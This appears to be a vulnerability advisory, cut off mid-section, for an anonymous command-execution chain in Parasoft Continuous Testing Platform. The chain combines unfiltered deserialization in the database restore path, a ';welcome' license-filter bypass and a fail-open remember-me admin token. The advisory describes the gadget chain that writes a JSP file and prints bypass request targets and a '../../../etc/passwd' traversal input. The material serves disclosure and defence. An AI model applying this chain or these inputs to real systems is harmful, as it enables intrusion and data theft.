# Parasoft Continuous Testing Platform 10.7.5-SNAPSHOT — Unfiltered Java Deserialization in the Database Restore Path, a Raw-URI License Gate and a Fail-Open Remember-Me Gate (command execution as the product service identity; uid=1000(parasoft) observed)

## 1. Overview

### Overview of the finding

Two anonymous HTTP requests execute operating-system commands inside the Parasoft Continuous Testing
Platform's own JVM. The first request is a `multipart/form-data` POST to `/em/database/restore` whose request
target carries a `;welcome` path parameter; the second is a plain `GET` for a file under `/em/images/`.
Between them they cross three separate product-authored boundaries, and each boundary fails for a different
reason, which is why this finding is described as a chain of first-party defects rather than as one bug with
two symptoms.

The write half of the chain is unfiltered Java deserialization, CWE-502. The restore handler opens the
`database.ser` member of an uploaded zip with `new ObjectInputStream(in)` and calls `readObject()` on it. No
`ObjectInputFilter` is installed on that stream, and a survey of the shipped product finds no instance of
`ObjectInputFilter`, `jdk.serialFilter` or `serialFilter` at all - not in one class, not in one module, not in
a configuration file - against a positive control of 81 first-party files that contain `readObject`. The
absence is therefore architectural rather than an oversight at one call site: the codebase has no
deserialization filtering concept to omit. A gadget composed from libraries already on the product's own
classpath converts that `readObject()` into a write of attacker-chosen bytes to an attacker-chosen absolute
path.

The routing half is an interpretation conflict, CWE-436, with an authorisation consequence (CWE-863). The
platform's license filter decides whether to execute at all by matching the raw, un-normalised
`request.getRequestURI()` against exemption clauses that are unanchored at the front - `endsWith("welcome")`,
`endsWith("about")`, `endsWith("notlicensed")` - and the method that performs the test,
`isLicenseRequired()`, has exactly one call site in the whole class: `shouldNotFilter()`. A match does not
relax one check, it disables the entire filter, including the redirect that unlicensed instances are supposed
to receive and including a separate hardcoded guard for the `/tdm/api/v` tree. The servlet container strips
`;`-delimited path parameters from each URI segment before it performs servlet mapping, so the filter sees
`/em/database/restore;welcome` while the container routes `/em/database/restore`. The two components of the
same product disagree about what the request is.

The identity half is what lets an anonymous client arrive at either of those two in the first place. All three
Spring Security chains in the application register the same remember-me service, and that service contains an
explicit fail-open branch: when the external security-provider client is null, it returns an
already-authenticated `admin` token carrying the `ROLE_ADMIN` granted authority for a request that presented
no credential. The security configuration lists `/database` and `anyRequest()` as requiring an authenticated
subject, and this is precisely how the requirement is satisfied without one.

The landing point is `webapps/em/images/<leaf>.jsp`. The product's own `conf/web.xml` maps `*.jsp` to the
Jasper servlet, and the same unanchored license exemption that admits `;welcome` also exempts anything whose
URI `contains("/images/")`. So the file the deserialization wrote is compiled and executed by an anonymous
GET. The recorded runs returned `HTTP 200` with the run marker, the server-side evaluation of the arithmetic
expression `6*7` printed as `42`, the product's own `uid=1000(parasoft) gid=1000(parasoft)
groups=1000(parasoft)` identity line, `/etc/passwd` content read by the product process, and a self-cleanup
report; a request for a never-written file in the same directory returned `404` with the
`Apache Tomcat/10.1.57` error page. That contrast is what makes the `200` attributable to the write rather
than to any pre-existing page.

### Overview of the product and its runtime stack

Parasoft Continuous Testing Platform (CTP) is a closed-source commercial continuous-testing product from
Parasoft, a United States vendor. The platform combines environment management, service virtualisation and
test-data management; the deployed web application that carries its user interface and REST API is named `em`
and is served by an embedded Tomcat inside the vendor's own container image.

The verified build reports Java 17 (`17.0.20.1`), Tomcat 10.1.57 with the Jasper JSP engine enabled, Jersey
3.1.12 with the `jersey-mvc-freemarker` module, Spring 6.2.19 and Spring Security 6.5.11, Apache CXF 4.1.8,
HSQLDB 2.7.4, FreeMarker 2.3.34, nashorn-core 15.7, aspectjweaver 1.9.25.1 and commons-collections4 4.5.0.
The image carries 238 jars, of which 42 are first-party `com.parasoft.*` artefacts, and a first-party native
JNI library `libxtest.so` (154,608 bytes, built for five platforms) that the licensing subsystem loads. Two
of those bundled libraries matter to this finding and neither is its cause: aspectjweaver supplies the caching
map whose `writeToPath` performs the write, and commons-collections4 supplies the map and entry decorators that
force a virtual dispatch through the overridden `put`. Both are carriers. The root causes are the product's own
unfiltered `readObject()` and the product's own raw-URI license test.

The web deployment has ten `/*` servlet filters in `conf/web.xml` and four servlet mappings: `/` to the Spring
`DispatcherServlet`, `/api/*` to a Jersey `RestServletContainer`, `/tdm/api/*` to a
`TDMApiServletContainer`, and `/services/*` to CXF. There is no external reverse proxy, WAF or management-plane
separation in front of the application in the shipped image, so every one of those mappings is reachable by
whoever can reach the listener.

### Overview of the testbed and what that implies

The target was an instance started from the unmodified vendor container image inside an isolated container
sandbox on a cloud host, with the container's HTTP and HTTPS ports published to loopback addresses on that
sandbox host only. The image itself was loaded from a saved copy of the vendor's public
`parasoft/ctp:latest` artefact: 997,805,056 bytes, md5 `47946c7d1e7d99a00d6c90f4ae675f90`, image id prefix
`f99f7210fc67`, 985 MB once loaded. The client that fired the requests ran on the same sandbox host as an
ordinary unprivileged user, using Python 3.11.6 and the standard library only. No step of the chain was driven
from a second network host, and no packet left the sandbox.

Three consequences follow, and each is carried through the rest of this document rather than being stated
once and forgotten. First, because the instance was started from the untouched vendor image with no setup step
performed, its configuration state is the product's own factory state and not a state we produced; the
absence of an external security provider is the absence of a configuration step, which no amount of testbed
tinkering could have introduced. Second, because the container ports were published to loopback, the claim
"reachable from a network" rests on the shipped listener topology and on the fact that the product ships no
front-end filter of its own, rather than on a two-host demonstration. Third, because the container's clock and
the research host's clock are not synchronised, every timestamp quoted in this document belongs to the
container, and the timestamps inside the recorded command output are elided here: they identify our sandbox
rather than the product and they carry no information about the vulnerability.

### Overview of the affected-version claim, and what a `-SNAPSHOT` build means

The artefact self-identifies as version `10.7.5-SNAPSHOT` with `Build-Timestamp 202608231700 +0000` and a
buildId of the form `ctp<nightly stamp>-1000`, where the nightly stamp is the date component of that
Build-Timestamp. Advisory text in this repository does not carry dates, so the buildId is described by its
shape here and is supplied to the vendor verbatim in the notification. First-party `com.parasoft.xtest.*`
artefacts inside the same image are stamped `10.7.4.20260808`, which is the usual shape of a development line
whose platform layer lags its own core layer by one release.

In the Maven convention this build system uses, `-SNAPSHOT` marks an artefact taken from an in-progress
development line rather than an immutable, released, version-pinned artefact. It was obtained through the
vendor's mutable `latest` container tag, which by design resolves to different builds over time. That has
direct consequences for how the affected-version statement may be written:

- The claim that holds is narrow and is the one made throughout this document: *this build* is affected, and
  any build that ships the same `AbstractDatabaseBackup` and `EMLicenseFilter` source carries the same
  construction, because both defects are properties of that source rather than of a particular compilation.
- The claim that does not hold, and is not made, is "all 10.x releases are affected" or "version X fixes it".
  A `-SNAPSHOT` build cannot be mapped onto a released version range with certainty, and no second build was
  available to compare against.
- The vendor's public release naming for this product train is CTP 2026.1.x. The vendor's own published
  release notes for that train list security fixes exclusively in the form "resolved by updating" some
  third-party library, with no first-party security entry. That is documentation-level evidence that this root
  cause is unaddressed in the train, and it is explicitly *not* a measured claim: no build of that train other
  than the one tested was executed.

### Overview of affected scope

The affected component is the `em` web application: its database restore path, its license filter, its
remember-me authentication service, and its `images` directory insofar as that directory sits inside a
JSP-mapped web application root. Two sibling items are deliberately excluded from the claim. The vendor's
`dtp` distribution is a different product whose first-party jar set does not include
`com.parasoft.ctp.core`, the module that contains both root causes, so nothing here is asserted about it. And
no Windows-side variant of the platform was executed; the same image ships a first-party native library for
five platforms, so a Windows installation would carry the same Java-level construction, but that is a
structural expectation and not a test result.

### Overview of independence

Before treating a finding as unpublished, three independent catalogue axes were queried and one vendor-side
axis was checked against the shipped artefacts. The results, with their own limitations, are:

- NVD by CPE: a `virtualMatchString` query for this vendor's CPE prefix returned `totalResults = 0`, with
  positive controls confirming the query mechanism works (937 records for another network vendor, 335 for
  another management platform, 1822 for a build-automation product). A keyword query for the vendor name
  returns 2 records, and resolving each by identifier shows their real CPEs belong to a *different* vendor's
  plugin ecosystem - a continuous-integration server's plugins for this vendor's tooling, not this product.
  That reconciles the apparent contradiction between the keyword axis and the CPE axis.
- Exploit-DB: a query for the vendor name returned `recordsTotal = 0`, against a control of 38 for a
  well-catalogued VPN vendor.
- OSV over the Maven coordinates this product would use if it were published as a library: both plausible
  coordinate spellings returned an empty result. The platform is distributed as a container image and as a WAR,
  so it has no carrying ecosystem in a package-advisory database; that is a structural closure rather than a
  clean search.
- Shipped artefacts: the presence of zero `ObjectInputFilter`, `jdk.serialFilter` or `serialFilter` occurrences
  in the image, against 81 files containing `readObject`, proves the tested build is unhardened with respect to
  deserialization rather than hardened-and-misread. The only CVE identifier string anywhere in the product's
  text tree is a comment inside a vendored third-party JavaScript utility library, which concerns that library
  and not this product.
- Vendor documentation and release notes: a documentation-space search for serialisation-filtering terms
  returns only pages describing the rules the product's own static-analysis engine checks for other people's
  code - the concept appears in this vendor's corpus as something it detects, not as something it does. The
  database-restore documentation describes the entry point as an administration menu and instructs the operator
  to use a backup taken from the same version of the product, which is direct documentary evidence of the
  threat model: the backup file is treated as a version-locked, trusted, internal artefact, and the possibility
  that an attacker supplies one does not appear in it.

Two limitations on that sweep are stated plainly. A GitHub Security Advisory keyword search could not be
established as a leg at all, because the service silently ignored the keyword parameter and returned identical
results for different queries; that axis is therefore *not* clean, it is merely absent. And no jar-by-jar
comparison of the 238 bundled libraries against their upstream advisories was performed, which is why the
finding is scoped to the two first-party root causes and does not assert anything about bundled third-party
versions.

### Overview of what this document does not claim

- It does not claim root. Execution landed as `uid=1000(parasoft)`, the product's own service identity; no
  privilege escalation was attempted, and no escalation ladder is asserted to exist.
- It does not claim that *no* authenticated subject is involved at the Spring Security layer. Both hops pass
  through matchers that require an authenticated principal. The chain works anonymously because the product
  itself mints that principal in the state where no external security provider is configured. On a deployment
  where one is configured, a genuine subject is needed; that variant is scored as a labelled conditional
  reading and was not detonated.
- It does not claim the offline-forgeable session-cookie leg was demonstrated. That leg is a static and
  structural inference - the signing key is a compile-time string literal and the signature scheme carries no
  secret - it was exercised only in the state where it is redundant, and the combination that would make it
  interesting was never dynamically verified. Building a fake security provider to verify it was deliberately
  abandoned, because a researcher-supplied provider would have manufactured the very evidence being sought.
  The leg appears in this document only where it is labelled as not verified.
- It does not attribute the finding to aspectjweaver or commons-collections4. Those are carriers, and the
  functor-based chains usually associated with commons-collections4 are in fact unavailable against this
  product's library version, as described in the exploit-construction section.
- It does not attribute the finding to Tomcat or Jasper. Compiling a `.jsp` on request is what the product's
  own `conf/web.xml` asks the container to do.
- It does not claim that a second, script-assisted evaluation path (the embedded JavaScript engine) is
  reachable anonymously. Its capability layer was proven in isolation - command execution and arbitrary write
  as uid 1000, with no `ClassFilter` and no structural place to install one - but two reachability
  preconditions were never satisfied, so it is excluded from the rated chain and from the impact section.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Element | Value | Evidence class |
|---|---|---|
| Product | Parasoft Continuous Testing Platform (CTP), `em` web application | vendor artefact |
| Version tested | `10.7.5-SNAPSHOT`, `Build-Timestamp 202608231700 +0000`, buildId shape `ctp<nightly stamp>-1000` | image metadata |
| Container | Tomcat 10.1.57 with Jasper; Java 17 (`17.0.20.1`) | shipped `conf/web.xml`, JVM banner |
| Request count | 2 (one POST, one GET), both anonymous | measured over HTTP |
| Root cause 1 | `ObjectInputStream.readObject()` over an uploaded zip member with no filter — CWE-502 | source line + corpus-wide grep |
| Root cause 2 | Raw un-normalised `getRequestURI()` matched against unanchored `endsWith` exemptions, with a single call site in `shouldNotFilter()` — CWE-436 / CWE-863 | source lines + measured 302/200 contrast |
| Enabling gate | Fail-open remember-me branch mints an authenticated `ROLE_ADMIN` `admin` principal when no external security provider is configured — CWE-287 | source line + measured `users/current` response |
| Write primitive | Arbitrary absolute path, arbitrary bytes, via `SimpleCache$StoreableCachingMap.writeToPath` | bytecode-level reading + measured file on disk |
| Execution sink | Jasper `*.jsp` mapping over `webapps/em/images/`, license-exempt by `contains("/images/")` | `conf/web.xml:274-275`, `448-450`; measured 200 vs 404 |
| Landing identity | `uid=1000(parasoft) gid=1000(parasoft) groups=1000(parasoft)` | measured inside the product JVM and via `/proc/1/status` |
| Licence required | No | measured: `;welcome` bypass with a no-semicolon 404 control |
| CSRF token required | No | source: the CSRF exemption matcher lists `/database` |
| Database reachability required | No | source ordering: `readObject()` at line 117 precedes `getConnection()` at line 126 |
| Outbound connectivity required | No | design of the gadget; no callback of any kind |
| Not part of this chain | Privilege escalation, root, memory corruption, upstream library CVEs, the JavaScript-engine path, the forged-cookie leg | see sections 1, 8, 10 |

### Vulnerability Summary mechanics

The mechanism, stated as a single sequence: an anonymous client POSTs a zip. The license filter consults the
raw URI, sees that it ends with `welcome`, and returns `true` from `shouldNotFilter()`, so its
`doFilterInternal()` body never executes and neither the unlicensed redirect nor the `/tdm/api/v` guard runs.
The security chain then asks the remember-me service for a principal; because no external provider client
exists, the service constructs an authenticated `admin` token with the `ROLE_ADMIN` authority, and the
`authenticated()` matcher on `/database` is satisfied by it. The controller for the restore mapping accepts
the multipart body, hard-compares the zip's member names against the literals `version.txt` and `database.ser`,
which is a shape check that says nothing about content, and then hands the `database.ser` bytes to
`AbstractDatabaseBackup`, which wraps them in an `ObjectInputStream`, reads an `int`, and calls
`readObject()`. The stream's first object is a `java.util.HashSet`; reconstituting it forces a `hashCode()` on
its single element, which is a `TiedMapEntry` wrapping a `LazyMap` whose transformer factory is a
`ConstantTransformer` holding a byte array, and whose decorated map is a
`SimpleCache$StoreableCachingMap` whose `folder` field is an absolute path. The lazy map's `get()` performs a
`put()` on the decorated map, virtual dispatch lands on `StoreableCachingMap`'s override, and `writeToPath`
writes the byte array to `folder + File.separator + key` with no validation whatsoever. Only after all of that
does the code attempt `getConnection()`, which fails against the unreachable address the attacker supplied in
the `json` part, producing the `500` the client sees. The written file is a JSP page in a directory the
product serves and compiles, so an anonymous GET executes it and returns the command's output.

The order of those last two facts is the reason the endpoint's status code carries no information. A `500`
here means "your payload was deserialized and then the database step failed", which for this chain is success.

### Vulnerability Summary preconditions

- The instance must be in the state where no external security provider is configured, so that the fail-open
  branch applies. This is the state of the untouched vendor image; it was confirmed on the test instance by
  requesting the provider-configuration endpoint with a JSON `Accept` header and receiving `404` with an empty
  body, which matches the shipped controller's `getActiveConfig()==null` branch. That is a shipped-code fact
  about the pristine image, and not a property of anything we configured.
- The client must be able to reach the HTTP or HTTPS listener. Both were used; the license-bypass leg was
  retested over TLS with the same result.
- The target directory must be writable by uid 1000 and must be served and JSP-compiled.
  `webapps/em/images` is `drwxrwxr-x parasoft root`, so it is.
- No licence, no credential, no CSRF token, no outbound path, no database reachability, no timing window and
  no specific host information are required.

### Vulnerability Summary — why this is two first-party root causes plus one gate, not one bug

It would be possible to write this up as a single deserialization vulnerability and note the license bypass as
a delivery detail. That would be wrong in a way that matters to whoever fixes it, because the two defects have
different owners inside the product, different fixes and independent value to an attacker.

The deserialization defect alone is not anonymously reachable: with the license gate working, an unlicensed
instance receives a redirect to `/em/license` before the controller runs, which is exactly what the negative
control measured. The license-bypass defect alone executes nothing: it is an authorisation bypass that exposes
`/em/database/**` and the entire `/em/tdm/api/v*` tree to anonymous callers, which is a serious finding in its
own right but produces no code execution. And neither alone reaches an anonymous client at all without the
fail-open remember-me branch, because the security configuration requires an authenticated subject for both
the restore mapping and, outside a narrow allow-list, for the images path. Three fixes are therefore needed,
and a vendor that ships only the serialization filter still leaves an anonymous authorisation bypass and an
authentication gate that mints administrators out of nothing.

### Vulnerability Summary — measured end to end versus inferred from source

- Measured over HTTP against a live instance: the license-gate bypass on read-only endpoints in both HTTP and
  HTTPS; the anonymous `users/current` identity response and its `401` control; the restore POST and its
  `500`; the resulting file on disk with its exact size and ownership; the anonymous GET returning the executed
  page; the `404` control in the same directory; the post-deletion re-fetch still being served; the directory
  file-count difference before, during and after; the product log's success signature and its incrementing
  count; the alternative FreeMarker template landing and its evaluated output.
- Read from source or bytecode but not separately detonated: the identity of the two sibling `readObject()`
  call sites in the same class; the absence of any filtering primitive in the whole corpus; the exact
  `--add-opens` list of the target JVM, which was read from its own process command line and which explains why
  two classical gadget families are unavailable; the absence of JDBC drivers among the 238 jars; the
  hardening of the other upload and zip-handling code paths that were examined and ruled out.
- Structurally inferred and explicitly not verified: everything about the forged session cookie in a
  deployment where an external security provider *is* configured, and the reachability of the
  JavaScript-engine evaluation path. Both are labelled wherever they appear and neither is in the rated chain.

## 3. Authentication Boundary

### Authentication Boundary — how a principal is attached to a request

The application has three Spring Security filter chains, and all three register the same remember-me service,
`EMRememberMeServices` (483 lines). The security configuration class is `CTPSecurityWebConfig` (318 lines),
and its matcher order is significant because the first match wins:

```java
// CTPSecurityWebConfig.java, abridged, in evaluation order
requestMatchers({"/oauth2","/oauth2Error"}).permitAll()
requestMatchers({"/componenttypes/**","/components/**","/environments/**","/systems/**",
                 "/member/**","/pstsecconfig","/database"}).authenticated()
requestMatchers({"/choices/**"}).hasRole("ADMIN")
requestMatchers({"/resources/**","/welcome","/forgot","/healthcheck","/statuscheck",
                 "/images/welcome/*","/favicon.ico", ...}).permitAll()
anyRequest().authenticated()
```

Two details of that list decide the shape of this finding. `/database` is explicitly `authenticated()`, so the
restore mapping is not an unprotected route; and the images allow-list is `/images/welcome/*`, not
`/images/**`, so a file written to `images/<leaf>.jsp` also requires an authenticated subject at the security
layer. Both hops of the chain therefore sit *behind* the authentication boundary, and the honest description of
this finding is not "the endpoints are unauthenticated" but "the product hands an anonymous request an
authenticated administrative principal".

### Authentication Boundary — what the fail-open gate actually does

Inside `EMRememberMeServices`, the relevant sequence is a header short-circuit, a lookup, and a branch:

```java
// EMRememberMeServices.java:140-148, abridged
if (request.getHeader("Authorization") != null) {
    return null;                                  // :140-142 defer to explicit credentials
}
...
pstsecClient = PSTSecServiceClient.getInstance(); // :146
if (pstsecClient == null) {                       // :148 the fail-open branch
    return this.createAuthenticationToken("admin", "admin", EmUserInfo.Role.ADMIN, request);
}
```

The token constructed downstream registers `new SimpleGrantedAuthority("ROLE_ADMIN")` and wraps it in a Spring
Security `User` whose `authenticated` flag is `true`, so the resulting principal is a genuinely authenticated
administrator and not the container's anonymous principal. The condition guarding all of this is the absence
of the external security-provider client. In the untouched vendor image, with no setup step performed, that
client does not exist, so every anonymous request that carries no `Authorization` header arrives at the
matchers already holding `ROLE_ADMIN`.

Measured, with a control in the same run: an anonymous `GET /em/api/v3/users/current` returned `200` with the
body `{"id":1,"login":"admin","role":"ADMIN"}` and a content length of 39; the identical request carrying
`Authorization: Bearer garbage` returned `401` with an empty body. The control matters because it shows the
fail-open branch is specific to requests that present *no* credential - presenting a bad one takes the early
`return null` path instead.

A second, related first-party defect sits next to this one and is reported to the vendor without a score: the
platform's own authentication provider does not verify the submitted password at all
(`PSTAuthenticationProvider.java:144`). It is not used by this chain, because this chain consumes no
credential, but it means the fail-open branch is not the only way the identity layer can grant an
administrative session without proof.

### Authentication Boundary — CSRF

The restore mapping performs a state-changing POST, so the CSRF layer is part of the boundary.
`CsrfSecurityRequestMatcher` is 28 lines long and its exemption matcher is anchored:

```java
// CsrfSecurityRequestMatcher.java:19
unprotectedMatcher = ^(/api|/tdm/api|/websockets|/ui/websockets|/tdm/websockets|/coverage
                      |/database|/jobs|/license|/resources/j_spring_security_check|/services
                      |/systems|/upload|/v1|/v2).*$
// :22 GET, HEAD, TRACE and OPTIONS are exempt by method
```

`/database` is inside that alternation, so the restore POST needs no CSRF token. One correction to an earlier
reading of this code is recorded here because it changes what an attacker may do: the pattern *is* anchored with
`^`, so the exemption applies to paths beginning with those segments and not to arbitrary paths merely
containing them. The absence of a token requirement on this particular path stands regardless.

### Authentication Boundary — the license gate as a second authorisation boundary

`EMLicenseFilter` is 175 lines and behaves as an authorisation boundary: it is what stops an unlicensed
instance from serving its administrative API. Its decision procedure is:

```java
// EMLicenseFilter.java, abridged
:47  protected boolean shouldNotFilter(HttpServletRequest request) { ... return isLicenseRequired(request); }
:48  ...                                    // the ONLY call site of isLicenseRequired in the class
:99  if (path.startsWith("/tdm/api/v")) { ... write a fixed "not licensed" response ... }
:113 response.getOutputStream().flush();    // response committed here
:115 response.setStatus(403);              // unreachable in practice: the response is already committed
:118 ... if (!isLicensed()) response.sendRedirect("/em/license");
:165 String requestURI = request.getRequestURI();   // raw, un-normalised, still carries ';...'
:166 unrestricted = contains(LICENSE_PAGE) || endsWith("about") || endsWith("welcome")
                    || endsWith("forgot") || contains("/resources/") || ...
                    || contains("/images/") || ... || endsWith("notlicensed")
                    || (contains("/api/") && !contains("/tdm/api/v"))
                    || endsWith("/oauth2") || endsWith("/breadcrumbs");
:167-171 if (Accept contains application/json && !unrestricted) { unrestricted = <six unanchored tokens>; }
```

Three properties combine. The URI is taken raw, so `;welcome` is still present in the string being tested. The
exemption clauses are unanchored at the front, so any URI whose last characters happen to spell `welcome`,
`about` or `notlicensed` is exempt - no separator, no segment boundary, no equality. And the test's only
consumer is `shouldNotFilter()`, so an exemption suppresses the whole `doFilterInternal()` body rather than one
decision inside it: the `/tdm/api/v` guard at line 99 and the redirect at line 118 both stop existing.

The container's part of the conflict is ordinary behaviour: servlet containers strip `;`-delimited path
parameters from each segment before mapping. The filter and the router therefore disagree about the identity of
the same request, which is the textbook shape of CWE-436.

Measured, read-only, on a live instance:

| Request target | Measured response |
|---|---|
| `GET /em/database/currentConfig` | `302`, `Location: /em/license`, zero-length body |
| `GET /em/database/currentConfig;welcome` | `200`, 204 bytes, `application/json;charset=utf-8`, body begins `{"schemaVersion":201,"latestVersion":201,"type":"HyperSQL","user":"em","url":"jdbc:hsqldb:file:/usr/local/parasoft/ctp/h...` |
| `GET /em/database/currentConfig;about` | same `200`/204 - a second unanchored token works identically |
| `GET /em/database/currentConfigwelcome` (no `;`) | `404`, 792 bytes - proving the mechanism is the path parameter, not the literal suffix |
| `GET /em/tdm/api/v2/servers` | `200`, 90 bytes, `{"messageCode":1000,"message":"Continuous Testing Platform is not licensed.","status":403}` - HTTP `200` because line 113 flushes before line 115 sets the status |
| `GET /em/tdm/api/v2/servers;welcome` | `200`, 160 bytes, `application/xml;charset=UTF-8`, a well-formed `<serversResponse xmlns="http://www.parasoft.com/api/tdm/v2/servers/messages"><servers/></serversResponse>` - so Jersey routed and executed the resource method |
| Same pair over TLS | `200`/204 with the bypass, `302`/0 without it - the HTTPS listener is an equivalent surface, not a redirect shell |

The no-semicolon control is the load-bearing row. Without it one could argue the exemption is matching a
suffix string; with it, the only variable that changed is the presence of a `;` path parameter, and the
outcome flipped from a licensing redirect to a `200` carrying the live database configuration, including the
product's HSQLDB file URL and database user.

### Authentication Boundary — what the bypass does not reach

`;welcome` disables the filter and nothing else. Resource classes, handlers and delegate layers that perform
their own licensing check are unaffected, and this was measured rather than assumed: coverage-agent endpoints
read the license manager directly and kept returning `403` with the 90-byte unlicensed body across all
seventeen of their mappings even with the bypass applied, and a server-resource feature gate kept returning
`403` with a 94-byte body. Any write-up that presents the bypass as "the whole product becomes anonymously
administrable" would be wrong. What it does unlock is everything whose enforcement lives only in the filter -
which includes all of `/em/database/**` and the entire `/em/tdm/api/v*` tree, and which is why the restore
handler in this chain runs at all.

It is also worth recording why this was missed on the first pass over the same product. An earlier
URI-confusion battery tested encoded slashes, doubled slashes, dot segments and hex-encoded characters, and
correctly concluded that on those axes bypass and routing are mutually exclusive. Every one of those lives on
the encoding or normalisation axis. The `;` path parameter is a different axis - parameter separation - and it
was never tested. The methodological consequence is that URI-confusion testing has to enumerate axes rather
than instances: encoding, normalisation, parameter separators (`;` and its percent-encoded form) and
separator-free suffix anchoring.

### Authentication Boundary — what is deliberately not claimed

The fail-open branch is a property of a configuration state. Where an operator has configured the external
security provider, `PSTSecServiceClient.getInstance()` is not null, the branch does not apply, and both hops
require a genuine authenticated subject. That variant was not detonated. The product does contain a session
cookie, `PST_LT_FEATURES_INFORMATION`, whose signed plaintext is
`user:expiry::localAddr:"rememberMeAuthenticated"` and which is forgeable offline: the signing material is that
compile-time string literal and the signature is produced with bcrypt, which carries no secret, so anyone who
reads the shipped class can compute one. Forgery was demonstrated in the *unconfigured* state, with five
negative controls, where it buys nothing. The combination that would make it interesting, a configured
deployment driven end to end with a forged subject, is **not verified**: no such run exists, and the obvious
way to build one was rejected because installing our own security provider would have created the condition
being measured. Wherever that leg appears in this document it carries that label, it is scored only as a
conditional reading, and it is never described as demonstrated.

## 4. Attack Surface

### Attack Surface — listeners, mappings and filters

| Surface | Value | Note |
|---|---|---|
| HTTP listener | container port 8080 | served the whole chain in the recorded runs |
| HTTPS listener | container port 8443 | equivalent surface, not a redirect shell; license-bypass leg retested over TLS |
| Testbench publication | loopback on the sandbox host | our harness's choice, not a product restriction |
| Servlet filters | ten `/*` filters in `conf/web.xml` | includes the license filter |
| Servlet mappings | `/` Spring `DispatcherServlet`; `/api/*` Jersey `RestServletContainer`; `/tdm/api/*` `TDMApiServletContainer`; `/services/*` CXF | four independent routing stacks in one application |
| Front end | none | no shipped reverse proxy, WAF or management-plane split |
| Runtime identity | uid 1000 | the image runs as a non-privileged user |

The consequence of four routing stacks behind one set of hand-written gates is that enforcement is not
centralised. License enforcement in particular lives in two places at once: the filter, and per-controller calls
to `checkLicensing()`.

### Attack Surface — how the surface was mapped, and how uneven the enforcement is

License enforcement inside the API layer is manual. A survey of the shipped first-party code found 97
occurrences of `checkLicensing()` across 17 files, against 31 routed Jersey resource classes - so 54.8 percent
of routed resource classes perform any licensing check at all. The filter's own exemption expression adds a
whole exempt region rather than a route: `contains("/api/") && !contains("/tdm/api/v")` means everything under
`/em/api/` never reaches the licence filter, and enforcement there depends entirely on whether each controller
remembered to call the check. One concrete consequence, measured and reported without a score: the resource
class backing the backup endpoints (`DatabaseResourceV2`, 213 lines) contains zero occurrences of
`checkLicensing()`, so `GET` and `POST` on `/em/api/v2/database/backups` and `/em/api/v3/database/backups`
allow an anonymous caller to download the platform's `database.ser` and to create backups. The v2 variant is an
undocumented twin - the shipped OpenAPI description covers only v3 - which is why it was found by reading the
routing table rather than the documentation.

The unevenness is the surface-level story of this product: gates exist, and their coverage is partial by
construction, so any single missing check becomes an anonymous entry point.

### Attack Surface — shipped secret material

Twenty-eight hardcoded secret values were inventoried in the shipped artefacts, of which seventeen participate
in security decisions. None is needed by this chain, and none is used to bypass licensing; they are reported
because they widen what a single write or read primitive is worth:

- The shipped TLS keystore `server-keystore.jks` carries the industry-default store password `changeit`, and
  that password appears in plaintext in `server.xml` at lines 110-112. Every installation that did not replace
  the keystore therefore shares one TLS key pair, so a passive observer anywhere in the deployment population
  who has the image can decrypt captured sessions. This was checked once, by listing the keystore with the
  documented password; no brute-forcing was attempted, and the check succeeded on the first attempt.
- `AES128Cipher.java` lines 41-43 hold three hardcoded AES-128 keys and use the key as the IV, which removes
  the semantic-security benefit of an IV entirely.
- `NativeBlowfish.cc` line 36 constructs a Blowfish encoder with a literal string argument and iteration count
  5, used by the licensing subsystem to decode licence feature data.
- A salt is present as a string literal rather than as generated material.

### Attack Surface — surfaces that were tested and closed

Recording what did *not* work is what makes the surface map trustworthy, so four candidate paths were pursued
and abandoned with reasons:

- A file-API variant that takes an extension parameter appeared to allow a traversal into `.jsp`, and is
  closed by two independent walls. The extension helper takes everything after the last `.`, so `../` is
  discarded; and the manager underneath uses `File.createTempFile`, so the JDK's own temporary-file machinery
  rejects a suffix containing a separator - the product even echoed back its own failure message containing the
  attempted suffix.
- Upload, temp and task endpoints under `/em/tdm/api/` have no mounted handler at all. The generated WADL
  advertises paths that do not exist, which is a documentation defect and a trap for surface mapping.
- Classic zip-slip is closed in the live extraction helper, whose entry-name checks are hardened; a second,
  older zip utility in the tree has zero callers, i.e. it is dead code; and the import path used by restore
  reads members into an in-memory map rather than extracting them to disk.
- The restore handler's own member selection is a hard comparison against two literals, so no alternative
  member name can be smuggled in to change which bytes reach the stream.

One path was *not* closed and is reported separately rather than folded into this chain: a temp-file handler
builds `new File(tempDir, fileID)` by pure concatenation from a `@QueryParam`. Measured: `GET` on the
csv-columns endpoint with the bypass and a `fileID` of `../../../../../../../etc/passwd` returned `200` with a
47-byte body holding the first passwd line verbatim, and a `DELETE` on the temp-files endpoint with a traversal
`fileID` removed a file that had been created for the test. That is anonymous arbitrary read and anonymous
arbitrary delete (CWE-22) from the same root-cause family - unvalidated path concatenation - and it is not
execution, so it is not part of the rated chain.

## 5. Sink Identification

### Sink Identification — how the sink was found

The sink was found by searching the shipped first-party sources for the deserialization entry point and then
searching for the mitigation, in that order, because the second search is what determines whether the first is
a finding. The corpus consists of the decompiled first-party classes plus the platform-layer sources: several
thousand `.java` files in the core tree and 466 in the web-layer tree. In the whole shipped product:

- `ObjectInputStream` appears in 68 files, 149 occurrences, in the core tree, and in 3 files in the web layer.
- `readObject` appears in 81 files.
- `ObjectInputFilter` appears in 0 files. `jdk.serialFilter` appears in 0 files. `serialFilter` appears in
  0 files.

A single zero is weak evidence, because a filter can also be installed by JVM argument or by a container. Three
zeros, across a class name, a system property and its short alias, in an image that was unpacked and searched
as artefacts, is a strong result: this product has no deserialization filtering anywhere in its construction.

### Sink Identification — sink 1, the unfiltered readObject

The restore path lands in `com.parasoft.ctp.core.database.backup.AbstractDatabaseBackup` (518 lines, 19,851
bytes, md5 `704e1976f78e118e3221d90675bebe73`):

```java
// AbstractDatabaseBackup.java
:14   import java.io.ObjectInputStream;
...
:111  ObjectInputStream ois = new ObjectInputStream(in);      // 'in' is the uploaded zip member database.ser
:112  int numTables = ois.readInt();
...
:117  TableMetadata tableMetadata = (TableMetadata) ois.readObject();   // CWE-502, no filter
...
:126  Connection connection = this.provider.getConnection();  // AFTER readObject
```

Three facts about those lines are decisive. The cast to `TableMetadata` is applied to whatever `readObject()`
returns, so it constrains nothing: the gadget executes during the call, and the resulting
`ClassCastException` is thrown afterwards. The `getConnection()` call sits nine lines lower, so no database
needs to exist, be reachable or accept the supplied parameters. And the `int` read at line 112 is consumed
before the object read, which is why the crafted stream begins with a `writeInt` value that the payload
generator sets to 1.

The caller is the web-layer controller `EMDatabaseController` (1359 lines):

```java
// EMDatabaseController.java
